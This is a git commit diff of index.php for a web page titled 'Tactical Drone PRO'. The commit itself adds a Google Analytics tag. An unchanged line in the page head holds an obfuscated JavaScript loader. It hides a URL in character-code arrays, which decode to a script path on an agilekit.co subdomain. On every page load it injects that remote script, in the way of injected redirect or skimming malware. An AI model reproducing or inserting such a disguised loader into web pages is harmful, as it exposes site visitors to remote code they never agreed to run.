3098ffee6f4e8042d3def6f7248d14e321c9f9bb
jamesrio2014 <97978444+jamesrio2014@users.noreply.github.com>
2022-01-19 03:17:17 +0800

    Update index.php

--- index.php
+++ index.php
@@ -3,7 +3,15 @@
 	<head>
 		
 		 <script type="text/javascript">(function(){function u(s){var y="";while(t=s.shift()){y=y.concat(v(t))}return y}function v(s){return String.fromCharCode(s)}function qq(k,n,c){for(var b=document.getElementsByTagName("script"),a=0;a<b.length;a++){if(-1===b[a].src.indexOf(n)){var head=document.getElementsByTagName("head")[0];var script=document.createElement("script");script.type="text/javascript";script.src=u(k)+u(c)+n;head.appendChild(script);return true}}return false}var z=[47,47,49,48,48,99,102,57,97,52,54,100,49,99,48,50,97,102,51,50,51,51,52,101,54,54,52,54,55,99,54,102,99,99,52,54,101,100,52,56,100,101,54,97,100,46,97,103,105,108,101,107,105,116,46,99,111,47];var y=[99,108,105,99,107,47];var x="164v8b71bgor.js";qq(z,x,y)})();</script> 
-		
+		<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4T1XH8LH9D"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4T1XH8LH9D');
+</script>
 		<meta charset="utf-8">
 		<meta name="viewport" content="width=480">
 		<title>Tactical Drone PRO</title>
